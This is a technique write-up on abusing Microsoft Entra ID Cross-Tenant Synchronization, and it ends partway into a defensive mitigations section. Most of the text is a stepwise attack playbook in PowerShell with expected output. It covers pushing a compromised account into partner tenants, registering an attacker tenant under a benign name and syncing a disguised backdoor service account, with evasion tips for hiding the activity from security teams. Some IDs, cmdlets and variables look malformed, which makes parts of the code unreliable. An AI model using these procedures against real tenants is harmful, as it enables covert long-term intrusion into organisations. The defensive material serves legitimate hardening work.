# [PERSIST-TRUST-002]: Tenant-to-Tenant Migration Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-TRUST-002 |
| **MITRE ATT&CK v18.1** | [T1484.002 - Domain or Tenant Policy Modification: Trust Modification](https://attack.mitre.org/techniques/T1484/002/) |
| **Tactic** | Persistence, Defense Evasion, Lateral Movement |
| **Platforms** | M365, Entra ID, Cross-Cloud (Multi-tenant Organizations) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID versions with Cross-Tenant Synchronization enabled |
| **Patched In** | Partial mitigations in 2025; core vulnerability remains exploitable |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Cross-Tenant Synchronization (CTS) is a Microsoft Entra ID feature enabling organizations to automatically synchronize users, groups, and applications across multiple tenants in a controlled manner. An attacker with sufficient privileges in a compromised tenant (Global Administrator, Hybrid Identity Administrator, or Cloud Application Administrator) can abuse CTS to either: (1) Move laterally to partner tenants by synchronizing already-compromised accounts into target tenants, or (2) Establish persistence by creating an attacker-controlled "rogue" tenant as a cross-tenant partner and configuring automatic user synchronization for indefinite access. CTS-based backdoors are particularly dangerous because they abuse a legitimate business feature, making detection extremely difficult without deep tenant audit log analysis.

**Attack Surface:** Cross-Tenant Synchronization configurations, Cross-Tenant Access policies, synchronization service principals, automatic user invitation redemption settings, and user/group assignment to CTS applications.

**Business Impact:** **Persistent Lateral Movement and Indefinite Backdoor Access**. An attacker can maintain access across multiple tenants indefinitely by leveraging legitimate CTS mechanisms. They can create fake "contractor" or "service account" users that persist even after incident response efforts in the primary compromised tenant. CTS backdoors allow attackers to bypass detection systems focused on user sign-ins because the synchronized accounts appear to be legitimate guest users created through normal business processes.

**Technical Context:** CTS attacks are low-noise and difficult to detect because synchronization is a standard administrative operation. The attack can be executed in minutes but enables months or years of undetected persistence. Detection likelihood is **Low** if tenant synchronization logs are not actively monitored and correlated with organizational change management records; most organizations cannot distinguish legitimate CTS configurations from attacker-created backdoors.

### Operational Risk

- **Execution Risk:** Low - Requires only administrative permissions in compromised tenant; no special exploits needed
- **Stealth:** Critical - Leverages legitimate business feature (CTS), blending perfectly with normal tenant management
- **Reversibility:** No - Requires awareness of CTS backdoor configuration and complete revocation of cross-tenant trusts; recreating backdoors is easy

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2, 6.1 | Protect external access; manage multi-tenant relationships; restrict administrative access |
| **DISA STIG** | U-15433 | Control cross-tenant and external identity provider relationships |
| **CISA SCuBA** | EXO.02.065 | Monitor and restrict external tenant synchronization and guest access |
| **NIST 800-53** | AC-2, AC-3, IA-5 | Account Management; Access Control; Authentication |
| **GDPR** | Art. 32, Art. 5(1)(a), Art. 5(1)(f) | Security of Processing; lawfulness, fairness, transparency; integrity |
| **DORA** | Art. 9, Art. 21 | Protection and Prevention; incident management and notification |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; access control and third-party management |
| **ISO 27001** | A.9.2.3, A.6.2 | Privileged access; managing third-party relationships |
| **ISO 27005** | "Compromise of cross-tenant trust relationships" | Risk of unauthorized lateral movement across organizational boundaries |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Global Administrator role in the compromised tenant, OR
- Hybrid Identity Administrator + Cloud Application Administrator, OR
- A combination of: Security Administrator (CTA config) + Hybrid Identity Admin (CTS config) + Cloud App Admin (app assignment)

**Required Access:**
- Network access to Microsoft Entra admin portal or Microsoft Graph API
- Compromised account with one of the above role combinations
- Entra ID Premium P1 licenses for synced users (or P2 for certain features)

**Supported Versions:**
- **Entra ID:** All versions with cross-tenant synchronization enabled (feature released 2023)
- **Microsoft 365:** All E3, E5, Business Premium (feature available)
- **PowerShell:** Azure AD PowerShell v2.0.2+, Microsoft Graph PowerShell SDK 2.0+

**Tools:**
- [Microsoft Entra admin center](https://entra.microsoft.com) (web UI)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)
- [Azure AD PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/active-directory/overview)
- [Tenable Entra ID Synchronization Tools](https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Lateral Movement via Existing Cross-Tenant Synchronization

**Supported Versions:** All Entra ID versions with CTS enabled

#### Step 1: Enumerate Cross-Tenant Synchronization Configurations

**Objective:** Identify existing cross-tenant relationships and determine which tenants have outbound synchronization enabled (allowing user push to target tenants).

**Command (PowerShell):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "CrossTenantUserProfileSharing.ReadWrite.All", "Directory.Read.All"

# Get all cross-tenant access policies
$ctaPolicies = Get-MgBetaCrossTenantAccessPolicy

# List all configured cross-tenant partners
$partners = Get-MgBetaCrossTenantAccessPolicyPartner
Write-Output "=== Cross-Tenant Partners ==="
$partners | Select-Object TenantId, DisplayName, CreatedDateTime | Format-Table

# For each partner, check inbound/outbound synchronization settings
foreach ($partner in $partners) {
    Write-Output "`n=== Partner: $($partner.DisplayName) ($($partner.TenantId)) ==="
    
    # Get inbound trust settings (if this tenant receives synced users FROM partner)
    $inboundTrust = Get-MgBetaCrossTenantAccessPolicyPartnerInboundTrust `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId
    
    Write-Output "Inbound Trust:"
    Write-Output "  - AutomaticUserInviteRedemption: $($inboundTrust.AutomaticUserInviteRedemption)"
    Write-Output "  - MFA Recognized: $($inboundTrust.IsMfaRecognized)"
    
    # Get outbound trust settings (if this tenant SENDS synced users TO partner)
    $outboundTrust = Get-MgBetaCrossTenantAccessPolicyPartnerOutboundTrust `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId
    
    Write-Output "Outbound Trust:"
    Write-Output "  - AutomaticUserInviteRedemption: $($outboundTrust.AutomaticUserInviteRedemption)"
    
    # Get inbound synchronization settings
    $inboundSync = Get-MgBetaCrossTenantAccessPolicyPartnerInboundSynchronization `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId
    
    Write-Output "Inbound Synchronization:"
    Write-Output "  - Sync Allowed: $($inboundSync.IsSyncAllowed)"
    
    # Get outbound synchronization settings (CRITICAL: Can we push users OUT?)
    $outboundSync = Get-MgBetaCrossTenantAccessPolicyPartnerOutboundSynchronization `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId
    
    Write-Output "Outbound Synchronization:"
    Write-Output "  - Sync Allowed: $($outboundSync.IsSyncAllowed)"
    Write-Output "  - Sync from Azure AD Allowed: $($outboundSync.IsSyncFromAADAllowed)"
    
    # If outbound sync is enabled, this is a potential target for lateral movement
    if ($outboundSync.IsSyncAllowed -eq $true) {
        Write-Warning "CRITICAL: Outbound synchronization to $($partner.DisplayName) is ENABLED"
        Write-Warning "  → Can synchronize users into target tenant"
    }
}

# Get list of CTS synchronization applications
$servicePrincipals = Get-MgServicePrincipal -Filter "DisplayName eq 'Cross-Tenant Synchronization'" -All
Write-Output "`n=== Cross-Tenant Synchronization Service Principals ==="
$servicePrincipals | Select-Object Id, DisplayName, AppId | Format-Table
```

**Expected Output:**

```
=== Cross-Tenant Partners ===
TenantId                             DisplayName              CreatedDateTime
--------                             -----------              ---------------
a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d Trusted Partner Org      2023-05-15 10:30:00
b2c3d4e5-f6a7-b8c9-d0e1-f2a3b4c5d6e7 Target Migration Tenant  2024-01-20 14:15:00

=== Partner: Trusted Partner Org (a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d) ===
Inbound Trust:
  - AutomaticUserInviteRedemption: True
  - MFA Recognized: False

Outbound Trust:
  - AutomaticUserInviteRedemption: False

Inbound Synchronization:
  - Sync Allowed: False

Outbound Synchronization:
  - Sync Allowed: True
  - Sync from Azure AD Allowed: True

CRITICAL: Outbound synchronization to Trusted Partner Org is ENABLED
  → Can synchronize users into target tenant
```

**What This Means:**
- Outbound synchronization is enabled to at least one tenant
- We can identify which tenants are vulnerable to user synchronization attacks
- We now have the target tenant ID for lateral movement
- Automatic user invitation redemption being enabled increases the likelihood of successful synchronization

**OpSec & Evasion:**
- Perform this reconnaissance as part of routine "cross-tenant synchronization audit"
- Execute during normal business hours
- Do not export results to files visible to security tools

---

#### Step 2: Identify Users Already Synced to Target Tenant (Stealth Approach)

**Objective:** Find users already synchronized to the target tenant to use as lateral movement vector without creating new suspicious users.

**Command (PowerShell):**

```powershell
# Get the target partner tenant ID from previous enumeration
$targetTenantId = "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d"

# Get the CTS synchronization application
$ctsSyncApp = Get-MgServicePrincipal -Filter "DisplayName eq 'Cross-Tenant Synchronization'" | Select-Object -First 1

# Get all users assigned to the CTS application
$assignedUsers = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $ctsSyncApp.Id

Write-Output "=== Users Assigned to CTS Application ==="
foreach ($assignment in $assignedUsers) {
    # Get user details
    $user = Get-MgUser -UserId $assignment.PrincipalId
    Write-Output "User: $($user.UserPrincipalName)"
    Write-Output "  ID: $($user.Id)"
    Write-Output "  Department: $($user.Department)"
    Write-Output "  Job Title: $($user.JobTitle)"
    
    # Check if this user is already synced to the target tenant
    # (This requires advanced audit log analysis, shown in Method 2)
}

# Alternative: Check which users have successful sign-in history from the CTS app
$signInLogs = Get-MgAuditLogSignIn -Filter "appId eq '$($ctsSyncApp.AppId)'" | Select-Object -First 100
Write-Output "`n=== Recent CTS-Related Sign-ins ==="
$signInLogs | Select-Object UserPrincipalName, SignInStatus, ResourceDisplayName, TimeGenerated | Format-Table
```

**What This Means:**
- We've identified users already synced across tenant boundaries
- These users can be used for lateral movement without raising suspicion
- No new user creation needed, reducing audit trail evidence

---

#### Step 3: Add Compromised User to CTS Synchronization Scope

**Objective:** Add the currently compromised user account to the CTS synchronization application's scope, causing it to be pushed to the target tenant.

**Command (PowerShell):**

```powershell
# Get the CTS synchronization application
$ctsSyncApp = Get-MgServicePrincipal -Filter "DisplayName eq 'Cross-Tenant Synchronization'" | Select-Object -First 1

# Get the compromised user to sync (e.g., the user we're currently logged in as)
$compromisedUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.com'"

# Assign the compromised user to the CTS app (if not already assigned)
# This allows the user to be included in synchronization
New-MgServicePrincipalAppRoleAssignment `
    -ServicePrincipalId $ctsSyncApp.Id `
    -PrincipalId $compromisedUser.Id `
    -AppRoleId "01a6189b-a78b-4e47-b060-5a2885c133ff"  # User.ReadWrite role

Write-Output "Compromised user $($compromisedUser.UserPrincipalName) assigned to CTS app"

# Verify assignment
$assignments = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $ctsSyncApp.Id
$assignments | Where-Object { $_.PrincipalId -eq $compromisedUser.Id } | Select-Object PrincipalDisplayName, CreationTimestamp
```

**Expected Output:**
```
Compromised user attacker@contoso.com assigned to CTS app

PrincipalDisplayName CreationTimestamp
-------------------- -----------------
Attacker User        2026-01-09 15:30:00Z
```

**What This Means:**
- The compromised user is now part of the CTS synchronization scope
- The next synchronization job will push this user to the target tenant
- The user will appear as a legitimate "synced user" in the target tenant

---

#### Step 4: Trigger Synchronization Job and Access Target Tenant

**Objective:** Force the CTS synchronization job to run immediately, pushing the compromised user to the target tenant.

**Command (PowerShell):**

```powershell
# Get the synchronization job
$syncJobs = Get-MgBetaCrossTenantSynchronizationConfigurationPartnerTenantSynchronizationJob
$activeJob = $syncJobs | Where-Object { $_.SynchronizationJobSettings.Enabled -eq $true } | Select-Object -First 1

# Get the job ID
$jobId = $activeJob.Id

Write-Output "Active synchronization job: $jobId"

# Trigger the job to run immediately
Start-MgBetaCrossTenantSynchronizationConfigurationPartnerTenantSynchronizationJob `
    -CrossTenantSynchronizationJobId $jobId

Write-Output "Synchronization job triggered"
Write-Output "Waiting for job to complete..."

# Monitor job status
$maxWaitSeconds = 300
$elapsedSeconds = 0

while ($elapsedSeconds -lt $maxWaitSeconds) {
    $jobStatus = Get-MgBetaCrossTenantSynchronizationConfigurationPartnerTenantSynchronizationJob `
        -CrossTenantSynchronizationJobId $jobId
    
    Write-Output "Job status: $($jobStatus.Status) (Last execution: $($jobStatus.LastExecution))"
    
    if ($jobStatus.Status -eq "Completed" -or $jobStatus.Status -eq "Success") {
        Write-Output "Synchronization completed successfully!"
        break
    }
    
    Start-Sleep -Seconds 10
    $elapsedSeconds += 10
}

# Verify the user now exists in target tenant
Write-Output "`nVerifying user in target tenant..."
# This requires separate connection to target tenant
```

**Expected Output:**
```
Active synchronization job: a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d
Synchronization job triggered
Waiting for job to complete...
Job status: InProgress (Last execution: 2026-01-09T15:35:00Z)
Job status: Completed (Last execution: 2026-01-09T15:36:45Z)
Synchronization completed successfully!

Verifying user in target tenant...
```

**What This Means:**
- The compromised user has been successfully synchronized to the target tenant
- The attacker can now authenticate to the target tenant using the same credentials
- The user appears as a legitimate "B2B collaboration user" from a partner organization

**References & Proofs:**
- [Microsoft Cross-Tenant Synchronization - Vectra Research](https://www.vectra.ai/blog/microsoft-cross-tenant-synchronization)
- [CrowdStrike - Defending Against Azure Cross-Tenant Synchronization Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-defends-against-azure-cross-tenant-synchronization-attacks/)
- [Cloud Security Alliance - Defend Against Azure CTS Attacks](https://cloudsecurityalliance.org/blog/2024/03/15/defend-from-azure-cross-tenant-synchronization-attacks)

---

### METHOD 2: Creating an Attacker-Controlled Rogue Tenant as CTS Backdoor

**Supported Versions:** All Entra ID versions with CTS enabled

#### Step 1: Prepare Attacker-Controlled Tenant with Entra ID Premium License

**Objective:** Ensure the attacker's own tenant has Entra ID Premium P1 (for CTS licensing requirements).

**Command (In Attacker Tenant):**

```powershell
# Verify Entra ID Premium licenses are available
Connect-MgGraph -Scopes "Directory.Read.All", "Organization.Read.All"

# Check tenant subscription SKUs
$skus = Get-MgSubscribedSku
Write-Output "=== Entra ID Licenses Available ==="
$skus | Select-Object SkuPartNumber, PrepaidUnits | Format-Table

# Filter for Premium licenses
$premiumLicenses = $skus | Where-Object { $_.SkuPartNumber -like "*AAD*Premium*" }

if ($premiumLicenses) {
    Write-Output "Premium licenses available: $($premiumLicenses.Count)"
} else {
    Write-Output "WARNING: No Entra ID Premium licenses found"
    Write-Output "CTS requires at least one Premium license"
}

# Get tenant ID (needed for backdoor configuration)
$tenant = Get-MgContext | Select-Object TenantId
Write-Output "Attacker Tenant ID: $($tenant.TenantId)"
```

**Expected Output:**
```
=== Entra ID Licenses Available ===
SkuPartNumber                PrepaidUnits
--------------               -----------
AAD_PREMIUM_P1              {Enabled: 25, Suspended: 0, Warning: 0}
FLOW_FREE                   {Enabled: Unlimited, Suspended: 0, Warning: 0}

Premium licenses available: 1
Attacker Tenant ID: x9y8z7a6-b5c4-d3e2-f1g0-h9i8j7k6l5m4
```

**What This Means:**
- The attacker's tenant has the required licensing for CTS
- The tenant ID is documented for cross-tenant configuration

---

#### Step 2: In Compromised Tenant - Add Attacker Tenant as Cross-Tenant Partner

**Objective:** Create a cross-tenant access policy linking the compromised tenant to the attacker's tenant.

**Command (PowerShell - In Compromised Tenant):**

```powershell
# Connect to the COMPROMISED tenant
Connect-MgGraph -Scopes "CrossTenantUserProfileSharing.ReadWrite.All", "Application.ReadWrite.All"

# Attacker tenant ID
$attackerTenantId = "x9y8z7a6-b5c4-d3e2-f1g0-h9i8j7k6l5m4"

# Create a new cross-tenant access policy for the attacker tenant
$ctaPolicy = @{
    TenantId = $attackerTenantId
    DisplayName = "Trusted Development Partner"  # Legitimate-sounding name
    B2bDirectConnectAllowed = $true
    AutomaticUserInviteRedemption = $true  # CRITICAL: Auto-redeem invitations
}

New-MgBetaCrossTenantAccessPolicyPartner @ctaPolicy

Write-Output "Attacker tenant added as cross-tenant partner"

# Verify the partner was added
$partners = Get-MgBetaCrossTenantAccessPolicyPartner
$partners | Where-Object { $_.TenantId -eq $attackerTenantId } | Select-Object TenantId, DisplayName, B2bDirectConnectAllowed
```

**Expected Output:**
```
Attacker tenant added as cross-tenant partner

TenantId                             DisplayName                     B2bDirectConnectAllowed
--------                             -----------                     ----------------------
x9y8z7a6-b5c4-d3e2-f1g0-h9i8j7k6l5m4 Trusted Development Partner      True
```

**What This Means:**
- The attacker's tenant is now registered as a trusted cross-tenant partner
- Automatic user invitation redemption is enabled (users from attacker tenant are auto-invited)
- The next step is to enable synchronization

---

#### Step 3: Enable Inbound Synchronization from Attacker Tenant

**Objective:** Configure the compromised tenant to accept automatic user synchronization from the attacker's tenant.

**Command (PowerShell - In Compromised Tenant):**

```powershell
# Enable inbound synchronization from the attacker tenant
Update-MgBetaCrossTenantAccessPolicyPartnerInboundSynchronization `
    -CrossTenantAccessPolicyPartnerId $attackerTenantId `
    -BodyParameter @{
        IsSyncAllowed = $true
        IsSyncFromAADAllowed = $true  # Allow sync from Azure AD (not just cloud-native users)
    }

Write-Output "Inbound synchronization from attacker tenant ENABLED"

# Verify the configuration
$inboundSync = Get-MgBetaCrossTenantAccessPolicyPartnerInboundSynchronization `
    -CrossTenantAccessPolicyPartnerId $attackerTenantId

Write-Output "Inbound Sync Status:"
Write-Output "  - Sync Allowed: $($inboundSync.IsSyncAllowed)"
Write-Output "  - Sync from AAD Allowed: $($inboundSync.IsSyncFromAADAllowed)"
```

**Expected Output:**
```
Inbound synchronization from attacker tenant ENABLED

Inbound Sync Status:
  - Sync Allowed: True
  - Sync from AAD Allowed: True
```

**What This Means:**
- The compromised tenant is now configured to accept synchronized users from the attacker's tenant
- Any users created/synced from the attacker's tenant will be automatically added to the compromised tenant
- The backdoor is now ready for attacker use

---

#### Step 4: In Attacker Tenant - Configure Outbound Synchronization

**Objective:** Configure the attacker's tenant to push users to the compromised tenant.

**Command (PowerShell - In Attacker Tenant):**

```powershell
# Connect to the ATTACKER's tenant
Connect-MgGraph -Scopes "CrossTenantUserProfileSharing.ReadWrite.All", "Application.ReadWrite.All"

$compromisedTenantId = "c1d2e3f4-a5b6-c7d8-e9f0-a1b2c3d4e5f6"  # ID of victim org's tenant

# Create cross-tenant access policy pointing to the compromised tenant
$ctaPolicy = @{
    TenantId = $compromisedTenantId
    DisplayName = "Target Customer Org"
    B2bDirectConnectAllowed = $true
    AutomaticUserInviteRedemption = $true  # Auto-redeem invitations in target tenant
}

New-MgBetaCrossTenantAccessPolicyPartner @ctaPolicy

Write-Output "Compromised tenant configured as outbound partner"

# Enable outbound synchronization to push users to the compromised tenant
Update-MgBetaCrossTenantAccessPolicyPartnerOutboundSynchronization `
    -CrossTenantAccessPolicyPartnerId $compromisedTenantId `
    -BodyParameter @{
        IsSyncAllowed = $true
        IsSyncFromAADAllowed = $true
    }

Write-Output "Outbound synchronization to compromised tenant ENABLED"

# Verify configuration
$outboundSync = Get-MgBetaCrossTenantAccessPolicyPartnerOutboundSynchronization `
    -CrossTenantAccessPolicyPartnerId $compromisedTenantId

Write-Output "Outbound Sync Status:"
Write-Output "  - Sync Allowed: $($outboundSync.IsSyncAllowed)"
Write-Output "  - Sync from AAD Allowed: $($outboundSync.IsSyncFromAADAllowed)"
```

**Expected Output:**
```
Compromised tenant configured as outbound partner
Outbound synchronization to compromised tenant ENABLED

Outbound Sync Status:
  - Sync Allowed: True
  - Sync from AAD Allowed: True
```

**What This Means:**
- The bidirectional CTS backdoor is now fully configured
- The attacker's tenant can now push users to the compromised tenant
- Users will be automatically invited and added to the compromised tenant
- The backdoor persists indefinitely unless the CTS configuration is removed

---

#### Step 5: Create Backdoor Users in Attacker Tenant and Sync to Compromised Tenant

**Objective:** Create fake "service account" or "contractor" accounts in the attacker's tenant that will be synchronized into the compromised tenant for persistent access.

**Command (PowerShell - In Attacker Tenant):**

```powershell
# Create a backdoor service account in the attacker's tenant
$backdoorUser = New-MgUser `
    -DisplayName "Service Sync Account" `
    -MailNickname "service.sync" `
    -UserPrincipalName "service.sync@$($attackerTenantDomain)" `
    -PasswordProfile @{
        ForceChangePasswordNextSignIn = $false
        Password = "AttackerPassword123!SuperStrong!" + (Get-Random -Minimum 100000 -Maximum 999999)
    } `
    -AccountEnabled $true `
    -Department "IT Operations" `
    -JobTitle "Cloud Synchronization Service"

Write-Output "Backdoor user created: $($backdoorUser.UserPrincipalName)"
Write-Output "User ID: $($backdoorUser.Id)"

# Get the CTS synchronization application (created automatically by Microsoft)
$ctsSyncApp = Get-MgServicePrincipal -Filter "DisplayName eq 'Cross-Tenant Synchronization'" | Select-Object -First 1

if (-not $ctsSyncApp) {
    Write-Output "CTS app not found, creating..."
    # If not present, it's usually auto-created when CTS is first configured
    # This is a fallback in case manual creation is needed
}

# Assign the backdoor user to the CTS app (for synchronization)
New-MgServicePrincipalAppRoleAssignment `
    -ServicePrincipalId $ctsSyncApp.Id `
    -PrincipalId $backdoorUser.Id `
    -AppRoleId "01a6189b-a78b-4e47-b060-5a2885c133ff"  # Default user role

Write-Output "Backdoor user assigned to CTS application"

# Verify assignment
$assignments = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $ctsSyncApp.Id
$assignments | Where-Object { $_.PrincipalId -eq $backdoorUser.Id } | Select-Object PrincipalDisplayName
```

**Expected Output:**
```
Backdoor user created: service.sync@attacker.onmicrosoft.com
User ID: z9y8x7w6-v5u4-t3s2-r1q0-p9o8n7m6l5k4

Backdoor user assigned to CTS application

PrincipalDisplayName
--------------------
Service Sync Account
```

**What This Means:**
- A backdoor user account has been created in the attacker's tenant
- This user is assigned to the CTS synchronization app, so it will be synced
- On next synchronization, this user will appear in the compromised tenant as a legitimate "guest user"
- The attacker can use this account to maintain access indefinitely

---

#### Step 6: Trigger Synchronization to Push Backdoor User to Compromised Tenant

**Objective:** Force the synchronization job to run, pushing the backdoor user to the compromised tenant.

**Command (PowerShell - In Attacker Tenant):**

```powershell
# Get the synchronization job configured for the compromised tenant
$syncJobs = Get-MgBetaCrossTenantSynchronizationConfigurationPartnerTenantSynchronizationJob `
    -CrossTenantSynchronizationConfigurationId $compromisedTenantId

# Find active/enabled jobs
$activeJob = $syncJobs | Where-Object { $_.SynchronizationJobSettings.Enabled -eq $true } | Select-Object -First 1

if ($activeJob) {
    Write-Output "Running synchronization job: $($activeJob.Id)"
    
    # Trigger synchronization
    Start-MgBetaCrossTenantSynchronizationConfigurationPartnerTenantSynchronizationJob `
        -CrossTenantSynchronizationJobId $activeJob.Id
    
    Write-Output "Synchronization triggered"
    
    # Monitor job status
    $maxWait = 300
    $elapsed = 0
    while ($elapsed -lt $maxWait) {
        $jobStatus = Get-MgBetaCrossTenantSynchronizationConfigurationPartnerTenantSynchronizationJob `
            -CrossTenantSynchronizationJobId $activeJob.Id
        
        Write-Output "Job status: $($jobStatus.Status)"
        
        if ($jobStatus.Status -eq "Completed" -or $jobStatus.Status -eq "Success") {
            Write-Output "Synchronization completed!"
            break
        }
        
        Start-Sleep -Seconds 10
        $elapsed += 10
    }
} else {
    Write-Output "ERROR: No active synchronization job found"
    Write-Output "CTS may not be fully configured"
}

Write-Output "Backdoor user should now be available in the compromised tenant as a guest user"
```

**Expected Output:**
```
Running synchronization job: a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d
Synchronization triggered
Job status: InProgress
Job status: Completed
Synchronization completed!

Backdoor user should now be available in the compromised tenant as a guest user
```

**What This Means:**
- The backdoor user has been synchronized from the attacker's tenant into the compromised tenant
- The user is now available for login in the compromised tenant using the credentials from the attacker's tenant
- The attacker maintains indefinite access through the CTS backdoor
- Even if the original compromised account is disabled, the attacker can use the backdoor user account

**References & Proofs:**
- [Microsoft Cross-Tenant Synchronization - Feature Documentation](https://learn.microsoft.com/en-us/entra/identity/multi-tenant-organizations/cross-tenant-synchronization-overview)
- [Tenable - Entra ID Synchronization Remains Open for Abuse](https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse)

---

## 4. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Disable Cross-Tenant Synchronization if Not Required**

Organizations that do not require CTS should disable the feature entirely to eliminate the attack surface.

**Manual Steps (Entra ID Portal):**

1. Navigate to **External Identities** → **Cross-tenant synchronization**
2. Under **Inbound access settings**:
   - Set **Allow inbound sync** to **Disabled** (if not needed)
3. Under **Outbound access settings**:
   - Set **Allow outbound sync** to **Disabled** (if not needed)
3. Verify no synchronization jobs are configured
4. Delete any configured cross-tenant partners that are not explicitly approved

**PowerShell (Disable CTS Globally):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "CrossTenantUserProfileSharing.ReadWrite.All"

# Disable inbound synchronization globally
Update-MgBetaCrossTenantAccessPolicySelfTenantInboundSynchronization `
    -BodyParameter @{
        IsSyncAllowed = $false
        IsSyncFromAADAllowed = $false
    }

# Disable outbound synchronization globally
Update-MgBetaCrossTenantAccessPolicySelfTenantOutboundSynchronization `
    -BodyParameter @{
        IsSyncAllowed = $false
        IsSyncFromAADAllowed = $false
    }

Write-Output "Cross-tenant synchronization disabled globally"
```

**Apply To:** All tenants that do not have documented business requirement for CTS

---

**2. Audit and Remove All Unauthorized Cross-Tenant Partners**

Establish a definitive list of approved cross-tenant partners and immediately remove any not on the list.

**Manual Steps (Entra ID Portal):**

1. Navigate to **External Identities** → **Cross-tenant synchronization** → **Cross-tenant partners**
2. For each listed partner:
   - Verify the **Tenant ID** matches your approved list
   - Verify the **Partner Display Name** matches your organizational records
   - Check **Inbound/Outbound Sync** settings
3. For any partner not on your approved list:
   - Click on the partner
   - Select **Delete partner**
   - Confirm removal

**PowerShell (Audit and Remove Unauthorized Partners):**

```powershell
# Define your approved list of cross-tenant partners (by Tenant ID)
$approvedPartners = @(
    "a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d",  # HQ tenant
    "b2c3d4e5-f6a7-b8c9-d0e1-f2a3b4c5d6e7"   # Branch office tenant
)

# Get all configured partners
$partners = Get-MgBetaCrossTenantAccessPolicyPartner

foreach ($partner in $partners) {
    if ($partner.TenantId -notin $approvedPartners) {
        Write-Warning "UNAUTHORIZED PARTNER DETECTED: $($partner.DisplayName) ($($partner.TenantId))"
        Write-Warning "  Created: $($partner.CreatedDateTime)"
        
        # Option 1: Remove immediately (risky if misconfiguration)
        # Remove-MgBetaCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyPartnerId $partner.TenantId
        
        # Option 2: Disable synchronization first, then review before deletion
        Update-MgBetaCrossTenantAccessPolicyPartnerInboundSynchronization `
            -CrossTenantAccessPolicyPartnerId $partner.TenantId `
            -BodyParameter @{ IsSyncAllowed = $false }
        
        Update-MgBetaCrossTenantAccessPolicyPartnerOutboundSynchronization `
            -CrossTenantAccessPolicyPartnerId $partner.TenantId `
            -BodyParameter @{ IsSyncAllowed = $false }
        
        Write-Output "Synchronization disabled for unauthorized partner. Manual review required before deletion."
    }
}
```

**What to Look For:**
- Partners with tenant IDs not matching your organizational structure
- Partners created without documented change requests
- Partners with synchronization enabled that should be disabled
- Partners with names containing "Temp," "Test," "Dev," or similar indicators of backdoors

**Apply To:** All tenants with CTS enabled, conducted monthly

---

**3. Restrict Roles Required for CTS Configuration**

Implement strict access controls ensuring only approved administrators can create/modify cross-tenant synchronization configurations.

**Manual Steps (via Privileged Identity Management):**

1. Navigate to **Privileged Identity Management** → **Azure resources**
2. Select your tenant subscription
3. Click **Settings** → **Roles**
4. For each role that can modify CTS (Cloud Application Administrator, Hybrid Identity Administrator, Global Administrator):
   - Click the role
   - Click **Settings**
   - Enable **Require approval to activate**
   - Set **Approvers** to 2-3 senior security team members
   - Set **Maximum activation duration** to 4 hours
5. Enable **Notification** on every activation

**PowerShell (Enforce PIM Approval):**

```powershell
# Get roles that can modify CTS
$criticalRoles = @(
    "Global Administrator",
    "Hybrid Identity Administrator",
    "Cloud Application Administrator",
    "Security Administrator"
)

foreach ($roleName in $criticalRoles) {
    $role = Get-MgDirectoryRoleDefinition -Filter "displayName eq '$roleName'"
    
    # Enable approval requirement (requires PIM Premium - P2)
    # Implementation varies based on your Azure subscription
    
    Write-Output "Configured approval enforcement for: $roleName"
}
```

**Apply To:** All administrative roles capable of modifying CTS configurations

---

**4. Disable Automatic User Invitation Redemption**

Configure cross-tenant access policies to require manual approval before users from partner tenants are added.

**Manual Steps (Entra ID Portal):**

1. Navigate to **External Identities** → **Cross-tenant synchronization**
2. Under **Inbound access settings** → **Trust settings**:
   - Set **Automatically redeem invitations** to **Off**
3. Repeat for **Outbound access settings**

**PowerShell (Disable Auto-Redemption):**

```powershell
# Get all cross-tenant partners
$partners = Get-MgBetaCrossTenantAccessPolicyPartner

foreach ($partner in $partners) {
    # Disable automatic invitation redemption
    Update-MgBetaCrossTenantAccessPolicyPartnerInboundTrust `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId `
        -BodyParameter @{
            AutomaticUserInviteRedemption = $false
            IsMfaRecognized = $false  # Also require MFA from partner users
        }
    
    Update-MgBetaCrossTenantAccessPolicyPartnerOutboundTrust `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId `
        -BodyParameter @{
            AutomaticUserInviteRedemption = $false
        }
    
    Write-Output "Disabled auto-redemption for partner: $($partner.DisplayName)"
}
```

**Effect:** Guest users from partner tenants must manually accept invitation before access is granted, providing time to detect suspicious accounts.

**Apply To:** All cross-tenant access policies

---

### Priority 2: HIGH

**5. Monitor Cross-Tenant Synchronization Activity Continuously**

Implement automated detection and alerting for suspicious synchronization patterns.

**Manual Configuration (Microsoft Sentinel):**

